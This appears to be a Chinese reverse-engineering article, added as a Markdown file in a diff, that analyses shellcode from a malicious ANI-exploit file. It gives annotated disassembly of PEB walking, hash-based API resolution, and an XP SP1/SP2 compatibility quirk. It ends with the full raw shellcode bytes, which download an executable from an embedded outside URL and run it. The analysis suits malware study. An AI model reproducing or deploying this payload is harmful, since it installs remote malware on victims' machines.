@@ -1,0 +1,91 @@
+
+# 一份 shellcode 的详细分析
+
+> 原文：[`www.pediy.com/kssd/pediy09/pediy09-175.htm`](https://www.pediy.com/kssd/pediy09/pediy09-175.htm)
+
+> 这是从一个 ani 溢出攻击的 `xxx.ani` 文件中提取出来的一份 shellcode，做了下分析
+> 
+> 这里，先要谢谢 `forgot`，解答我关于 `pPEB`>`0x80000000` 的问题，原来是检测 win9x 用的，谢谢
+> 
+> 好了，进入正题吧
+> 
+> 代码:
+> 
+> * * *
+
+
+
+```
+> `02A200AC      mov     ebp, esp   02A200AE  mov     edx, fs:[30]          ; pPeb   02A200B5  lea     edx, [edx+3]          ; pPeb->SpareBool   02A200B8  cmp     byte ptr [edx], 1     ; 判断 shellcode 是否已运行   02A200BB  je      02A20189   02A200C1  mov     byte ptr [edx], 1     ; 设置 shellcode 已运行   02A200C4  call    02A20214              ; FARPROC Get_GlobalAlloc_Addr()   ; {          02A20214  call    02A20278            ; HMODULE GetBase_Kernel32()     ; {       02B20278  xor     eax, eax    02B2027A  mov     eax, fs:[eax+30]  ; pPeb    02B2027E  test    eax, eax    02B20280  js      short 02B20292    ; if (pPeb>0x80000000)==>if (win9x)，thx forgot!    02B20282  mov     eax, [eax+C]      ; pPeb->pPEB_LDR_DATA    02B20286  mov     esi, [eax+1C]     ; pPEB_LDR_DATA->InInitializationOrderModuleList    02B2028A  lods    dword ptr [esi]   02B2028B  mov     eax, [eax+8]      ; pBase_Kernel32    02B2028F  retn    02B20290  jmp     short 02B2029D    02B20292  mov     eax, [eax+34]     ; win9x,pPeb->pEventLog    02B20296  add     eax, 7C     02B20299  mov     eax, [eax+3C]     ; *(pEventLog+0x7c+0x3c),可能是 win9x 下 pBase_Kernel32    02B2029D  retn       ; }      02A20219  push    0C0397EC            ; hash Of "GlobalAlloc"    02A2021E  push    eax                 ; pBase_Kernel32    02A2021F  call    02A2029E            ; FARPROC GetProcAddr(HMODULE hModule,unsigned long hash)     ; {    02B2029E  pushad    02B2029F  mov     ebp, [esp+24]     ; pBase_Kernel32,pIMAGE_DOS_HEADER    02B202A4  mov     eax, [ebp+3C]     ; pIMAGE_DOS_HEADER->e_lfanew    02B202A8  mov     edx, [ebp+eax+78] ; pIMAGE_OPTIONAL_HEADER+0x78==pIMAGE_EXPORT_DIRECTORY RVA    02B202AD  add     edx, ebp          ; RVA to VA    02B202AF  mov     ecx, [edx+18]     ; NumberOfNames    02B202B3  mov     ebx, [edx+20]     ; AddressOfNames RVA    02B202B7  add     ebx, ebp          ; RVA to VA    02B202B9  jecxz   short 02B202F5    ; if (NumberOfNames==0)    02B202BB  dec     ecx     02B202BC  mov     esi, [ebx+ecx*4]  ;    02B202C0  add     esi, ebp          ; szExportFunName       ; 下面开始逐个算输出表中函数名 hash，再与所搜索函数的 hash 比较    02B202C2  xor     edi, edi          ;---------GetHash-------------------|    02B202C4  xor     eax, eax          ; unsigned long hash=0;             |    02B202C6  cld                       ; char* pCh=(char*)szExportFunName; |    02B202C7  lods    byte ptr [esi]    ; while (*pCh)                      |    02B202C8  test    al, al            ; {                                 |    02B202CA  je      short 02B202D3    ;   hash=(hash>>0x0d) + *pCh++;     |    02B202CC  ror     edi, 0D           ; }                                 |    02B202CF  add     edi, eax          ;                                   |    02B202D1  jmp     short 02B202C7    ;-----------------------------------|    02B202D3  cmp     edi, [esp+28]     ; if (hash==hash_GlobalAlloc)    02B202D8  jnz     short 02B202B9     02B202DA  mov     ebx, [edx+24]     ; AddressOfNameOrdinals RVA    02B202DE  add     ebx, ebp          ; RVA to VA    02B202E0  mov     cx, [ebx+ecx*2]   ; FunctionOrdinal    02B202E5  mov     ebx, [edx+1C]     ; AddressOfFunctions RVA    02B202E9  add     ebx, ebp          ; RVA to VA    02B202EB  mov     eax, [ebx+ecx*4]  ; FunctionAddr RVA    02B202EF  add     eax, ebp          ; pFun_API    02B202F1  mov     [esp+1C], eax    02B202F6  popad    02B202F7  retn                      ; return pFun_API       ; }    02A20224  add     esp, 8    02A20227  retn   ; }   02A200C9  push    300                   ; MemSize = 0x300   02A200CE  push    0                     ; Flags = GMEM_FIXED   02A200D0  call    eax                   ; kernel32.GlobalAlloc   029F00D2  mov     ecx, 300              ; 下面的 copy 计数器   029F00D7  mov     edi, eax              ; pBase_Heap   029F00D9  jmp     short 029F00E0   029F00DB  pop     esi                   ; 获取地址至 esi      ; 将 esi 指向的代码 copy 至刚申请的 heap 空间中                     029F00DC  rep     movs byte ptr es:[edi], byte ptr [esi]   029F00DE  call    eax                   ; 跳至 heap 空间中执行,eax==0x194E30   029F00E0  call    029F00DB              ; 定位下一句   029F00E5  jmp     short 029F00FE      ; heap 空间中   00194E30  jmp     short 00194E49   ...   00194E49  jmp     00195043   ...   00195043  call    00194E4E   ; {        00194E4E  pop     ebx         ; "hTTp://www.xxx.com/xxx.exe"    00194E4F  sub     esp, 114    00194E55  mov     edx, esp    00194E57  mov     dword ptr [edx], 20646D63   ;      00194E5E  mov     dword ptr [edx+4], 2220632F ; cmd /c "    00194E66  add     edx, 8    00194E69  xor     eax, eax    00194E6B  push    eax         ; IBindStatusCallback *pBSC    00194E6C  push    eax         ; dwReserved    00194E6D  push    104         ; dwBufLength=0x104    00194E72  push    edx         ; szFileName    00194E73  push    ebx         ; szURL->"hTTp://www.xxx.com/xxx.exe"    00194E74  push    eax         ; lpUnkcaller=NULL,非 ActiveX 组件    00194E75  call    00194F9B    ; Get_URLDownloadToCacheFileA_Addr()    ; {       00194F9B  call    00194EED  ; GetBase_urlmon_dll();    ; {             00194EED  push    6E6F            ;    00194EF2  push    6D4C7275        ; "urLmon"    00194EF7  jmp     short 00194F0B  ; 跳去，再 call 回下一行，则压入了 LoadLibraryA 返回地址    00194EF9  lea     eax, [esp+4]    00194EFD  push    eax             ; "urLmon",LoadLibraryA 的参数    00194EFE  call    00194E32    ; {        00194E32  push    edi           ; pBase_Heap+0x300 非参数，只是保存    00194E33  call    00194FC3      ; HMODULE GetBase_Kernel32()    00194E38  mov     edi, eax      ; pBase_Kernel32    00194E3A  xor     ecx, ecx    00194E3C  dec     ecx           ; ecx==4 GB    00194E3D  xor     eax, eax    00194E3F  mov     al, 0C3    00194E41  cld    ; 在 Kernel32.dll 中查找 0xC3，即找一个 retn 指令    00194E42  repne   scas byte ptr es:[edi]    00194E44  lea     eax, [edi-1]  ; Addr of retn    00194E47  pop     edi    00194E48  retn       ; }      00194F03  push    eax             ; Addr of retn,做 jmp 到 LoadLibraryA 时的返回地址    00194F04  call    00194FAF        ; FARPROC Get_LoadLibraryA_Addr()      ; {        00194FAF  call    00194FC3      ; HMODULE GetBase_Kernel32()    00194FB4  push    EC0E4E8E      ; hash Of "LoadLibraryA"    00194FB9  push    eax           ; pBase_Kernel32    00194FBA  call    00194FE9      ; FARPROC GetProcAddr(hModule, hash)    00194FBF  add     esp, 8    00194FC2  retn       ; }      00194F09  jmp     short 00194ED7              ; pFun=pLoadLibraryA    ;    00194ED7  cmp     byte ptr [eax], 55          ; if ((char *)pFun==0x55),即 push ebp    00194EDA  je      short 00194EEB    00194EDC  cmp     dword ptr [eax+5], 90909090 ; if (nop)    00194EE3  je      short 00194EEB    00194EE5  push    ebp      00194EE6  mov     ebp, esp    00194EE8  lea     eax, [eax+5]    00194EEB  jmp     eax           ; jmp (LoadLibraryA+5), LoadLibraryA("urLmon")       ; 看下这时的堆栈    ;0012CE80   0012CFD0  ebp    ;0012CE84   4FAD102D  kernel32.4FAD102D==> retn->-|    ;0012CE88   0012CE90  ASCII "urLmon"              v    ;0012CE8C   00194F10  返回到 00194F10 <---<<------|              ;...    00194F0B  call    00194EF9    00194F10  add     esp, 8          ; LoadLibraryA 返回后到这里    00194F13  retn       ; }    00194FA0  push    54FEF4F           ; hash Of "URLDownloadToCacheFileA"    00194FA5  push    eax               ; pBase_urlmon_dll    00194FA6  call    00194FE9          ; FARPROC GetProcAddr(hModule, hash)    00194FAB  add     esp, 8    00194FAE  retn       ; }    00194E7A  call    eax                  ; urlmon.URLDownloadToCacheFileA           ; 终于要下木马了，来看看这时的堆栈    ; call urlmon.URLDownloadToCacheFileA    ;0012CE9C   00194E7C  返回到 00194E7C    ;0012CEA0   00000000  LPUNKNOWN lpUnkcaller，非 ActiveX 组件    ;0012CEA4   00195048  LPCSTR szURL->hTTp://www.xxx.com/xxx.exe    ;0012CEA8   0012CEC0  LPTSTR szFileName，(szFileName-8)->cmd /c "    ;0012CEAC   00000104  DWORD dwBufLength    ;0012CEB0   00000000  DWORD dwReserved    ;0012CEB4   00000000  IBindStatusCallback *pBSC       00194E7C  mov     edi, esp    ; cmd /c"C:\Docume~1\admin\...\xxx[1].htm    00194E7E  mov     eax, edi      00194E80  add     eax, 8      ; szFileName->"C:\Docume~1\admin\...\xxx[1].htm"    00194E83  mov     bl, [eax]           ;---------------------------|    00194E86  test    bl, bl              ;                           |                  00194E88  je      short 00194E8D      ; while (*(char*)szFileName)|    00194E8A  inc     eax                 ;     szFileName++;         |    00194E8B  jmp     short 00194E83      ;---------------------------|    00194E8D  mov     byte ptr [eax], 22  ; 字符串末尾加"号，构成完整命令    00194E91  xor     edx, edx    00194E93  mov     [eax+1], dl         ; 填 0 截断字符串    00194E97  sub     esp, 54     00194E9A  xor     eax, eax    00194E9C  xor     ebx, ebx    00194E9E  mov     ecx, esp    00194EA0  cmp     eax, 54             ;---------------------------|    00194EA3  jge     short 00194EAE      ;                           |    00194EA5  mov     [ecx+eax], ebx      ;   MemZero                  |    00194EA9  add     eax, 4              ;                           |    00194EAC  jmp     short 00194EA0      ;---------------------------|    00194EAE  mov     ecx, esp    00194EB0  mov     ebx, ecx    00194EB2  add     ebx, 10    00194EB5  xor     eax, eax    00194EB7  mov     dword ptr [ebx+2C], 1 ; STARTF_USESHOWWINDOW    00194EBF  push    ecx         ; lpProcessInfo    00194EC0  push    ebx         ; lpStartupInfo    00194EC1  push    eax         ; lpCurrentDirectory==NULL    00194EC2  push    eax         ; lpEnvironment    00194EC3  push    eax         ; dwCreationFlags    00194EC4  push    eax         ; bInheritHandles    00194EC5  push    eax         ; lpThreadAttributes    00194EC6  push    eax         ; lpProcessAttributes    00194EC7  push    edi         ; lpCommandLine->cmd /c"C:\...\xxx[1].htm    00194EC8  push    eax         ; lpApplicationName    00194EC9  call    00194F87    ; FARPROC Get_CreateProcessA_Addr()      ; 同上 call LoadLibraryA，先检查头几个字节，再跳去 CreateProcessA    00194ECE  call    00194ED7    ; CreateProcessA       ; 启动完成，木马开始执行，好了，抛个 eip=0 的执行错误 88 了    00194ED3  nop    00194ED4  push    0    00194ED6  retn   ; }
+```
+
+
+
+这份 shellcode 在没有打 ani 补丁的 xpsp2 中可以顺利执行，但是在 sp1 中失败(我的 sp1 中，可能打过不同补丁情况会不一样)，原因出在调用 LoadLibraryA 时，它先检测 LoadLibraryA 头几个个字节，以决定是否要自己保存 ebp
+
+代码:
+
+```
+00194ED7 cmp byte ptr [eax], 55 ; if ((char *)pLoadLibraryA==0x55),即 push ebp
+00194EDA je short 00194EEB
+00194EDC cmp dword ptr [eax+5], 90909090 ; if (nop)
+00194EE3 je short 00194EEB
+00194EE5 push ebp
+00194EE6 mov ebp, esp
+00194EE8 lea eax, [eax+5]
+00194EEB jmp eax ; jmp (LoadLibraryA+5), LoadLibraryA("urLmon")
+```
+
+sp2 中，LoadLibraryA 开始几行为
+
+代码:
+
+```
+mov edi,edi
+push ebp
+mov ebp, esp
+cmp dword ptr [ebp+8], 0
+```
+
+但是，在 sp1 中(我的 sp1 (-\_-! )，LoadLibraryA 第一行既是
+
+代码:
+
+```
+cmp dword ptr [esp+4], 0
+```
+
+并没有保存 push ebp
+
+这样 shellcode 加了 push ebp 导致堆栈不平衡，于是整段 shellcode 就夭折了
+
+可见，这段 shellcode 通用性好像不太强，好像只能在 xpsp2 下执行的
+
+附上 shellcode
+
+代码:
+
+```
+8B EC 64 8B 15 30 00 00 00 8D 52 03 80 3A 01 0F 84 C8 00 00 00 C6 02 01 E8 4B 01 00 00 68 00 03
+00 00 6A 00 FF D0 B9 00 03 00 00 8B F8 EB 05 5E F3 A4 FF D0 E8 F6 FF FF FF EB 17 57 E8 8B 01 00
+00 8B F8 33 C9 49 33 C0 B0 C3 FC F2 AE 8D 47 FF 5F C3 E9 F5 01 00 00 5B 81 EC 14 01 00 00 8B D4
+3E C7 02 63 6D 64 20 3E C7 42 04 2F 63 20 22 83 C2 08 33 C0 50 50 68 04 01 00 00 52 53 50 E8 21
+01 00 00 FF D0 8B FC 8B C7 83 C0 08 3E 8A 18 84 DB 74 03 40 EB F6 3E C6 00 22 33 D2 3E 88 50 01
+83 EC 54 33 C0 33 DB 8B CC 83 F8 54 7D 09 3E 89 1C 01 83 C0 04 EB F2 8B CC 8B D9 83 C3 10 33 C0
+3E C7 43 2C 01 00 00 00 51 53 50 50 50 50 50 50 57 50 E8 B9 00 00 00 E8 04 00 00 00 90 6A 00 C3
+80 38 55 74 0F 81 78 05 90 90 90 90 74 06 55 8B EC 8D 40 05 FF E0 68 6F 6E 00 00 68 75 72 4C 6D
+EB 12 8D 44 24 04 50 E8 2F FF FF FF 50 E8 A6 00 00 00 EB CC E8 E9 FF FF FF 83 C4 08 C3 6A 6C 68
+6E 74 64 6C EB 12 8D 44 24 04 50 E8 0B FF FF FF 50 E8 82 00 00 00 EB A8 E8 E9 FF FF FF 83 C4 08
+C3 68 33 32 32 32 68 75 73 65 72 EB 12 8D 44 24 04 50 E8 E4 FE FF FF 50 E8 5B 00 00 00 EB 81 E8
+E9 FF FF FF 83 C4 08 C3 E8 5F 00 00 00 68 EC 97 03 0C 50 E8 7A 00 00 00 83 C4 08 C3 E8 4B 00 00
+00 68 AA FC 0D 7C 50 E8 66 00 00 00 83 C4 08 C3 E8 37 00 00 00 68 72 FE B3 16 50 E8 52 00 00 00
+83 C4 08 C3 E8 4D FF FF FF 68 4F EF 4F 05 50 E8 3E 00 00 00 83 C4 08 C3 E8 0F 00 00 00 68 8E 4E
+0E EC 50 E8 2A 00 00 00 83 C4 08 C3 33 C0 64 8B 40 30 85 C0 78 10 3E 8B 40 0C 3E 8B 70 1C AD 3E
+8B 40 08 C3 EB 0B 3E 8B 40 34 83 C0 7C 3E 8B 40 3C C3 60 36 8B 6C 24 24 36 8B 45 3C 36 8B 54 05
+78 03 D5 3E 8B 4A 18 3E 8B 5A 20 03 DD E3 3A 49 3E 8B 34 8B 03 F5 33 FF 33 C0 FC AC 84 C0 74 07
+C1 CF 0D 03 F8 EB F4 36 3B 7C 24 28 75 DF 3E 8B 5A 24 03 DD 66 3E 8B 0C 4B 3E 8B 5A 1C 03 DD 3E
+8B 04 8B 03 C5 36 89 44 24 1C 61 C3 E8 06 FE FF FF 68 54 54 70 3A 2F 2F 77 77 77 2E 68 61 63 6B
+65 72 65 78 70 2E 63 6E 2F 73 77 6F 72 64 2E 65 78 65 00
+```
+
+4dd466d0e1e0cc123afbe504da2462ca
